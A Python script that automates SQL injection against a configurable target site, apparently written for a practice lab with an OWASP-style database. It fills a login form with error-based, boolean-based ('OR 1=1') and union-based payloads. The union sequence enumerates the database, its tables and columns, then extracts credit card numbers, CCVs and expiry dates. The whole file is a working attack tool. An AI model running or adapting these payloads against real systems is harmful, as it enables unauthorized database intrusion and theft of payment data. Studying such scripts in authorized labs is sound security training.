'''----------------SQLi Automation ------------------------------
Here, the target site(basically the hostname) is configured.
The input field of the target website is basically the exploiting spot... which is accessed via mechanicalsoup module of python
Different types of sqli is tried on the input field of the target site
'''


import mechanicalsoup
import os
import time

#Importing dotenv module
from dotenv import load_dotenv

#To find a dotenv and load the environment variables into the script
load_dotenv()

#Accessing  the target site from .env file and creating an instance of StatefulBrowser to interact/interface with the targetsite
target_site = os.getenv('TARGET_SITE_SQLI')
browser = mechanicalsoup.StatefulBrowser()
browser.open(target_site)
print(browser.get_url())

# Common function to inject malicious script in input field
def sqli(username):

    #Checking whether the webpage is vulnerable to sqli by specifying the action of the form
    browser.select_form('form[action="./index.php?page=user-info.php"]')

    # 1--> Injecting malicious string 
    # 2--> launching the browser to see the response
    browser["username"]= username
    
    #submitting the response
    browser.submit_selected()
    
    # launching the browser to see the response
    browser.launch_browser()
    

# Type1--> Error based sqli
def error_based_sqli():
    payload1 = "'"
    sqli(payload1)

# Type2--> Boolean based sqli
def boolean_based_sqli():
    payload1 = " 1' OR 1=1#"
    sqli(payload1)

#Type3--> Union based sqli
def union_based_sqli():

    # before using union statement we shld know the number of columns accessed by the first part of query
    payload1 = "1' union select null,null,null,null,null #"
    sqli(payload1)
    # Therefore we can conculde first part of query is accessing 5 columns

    time.sleep(5)

    # Finding the database to access all it's tables
    payload2 = "1' union select 1,database(),null,null,null #"
    sqli(payload2)

    time.sleep(5)
 
    # Finding all the tables of the database
    payload3 = "1' union select 1,table_name,null,null,null from information_schema.tables where table_schema='owasp10'#"
    sqli(payload3)

    time.sleep(5)

    # Accesssing all the columns from sensitive table like(credit_cards)
    payload4 = "1' union select 1,column_name,null,null,null from information_schema.columns where table_name='credit_cards'#"
    sqli(payload4)
   
    time.sleep(5)

    # Accesssing all the columns from sensitive table like(credit_cards)
    payload5 = "1' union select 1,ccv,expiration,ccnumber,null from credit_cards #"
    sqli(payload5)

if __name__=="__main__":

    # Content
    print("Enter:\n"+"1 for error-based-sqli\n"+"2 for boolean-based-sqli\n"+"3 for union-based-sqli\n")
    type = int(input("Enter the option:"))

    if(type==1):
        error_based_sqli()

    elif(type==2):
        boolean_based_sqli()
    
    elif(type==3):
        union_based_sqli()

    else:
        print("Invalid option")
            













    
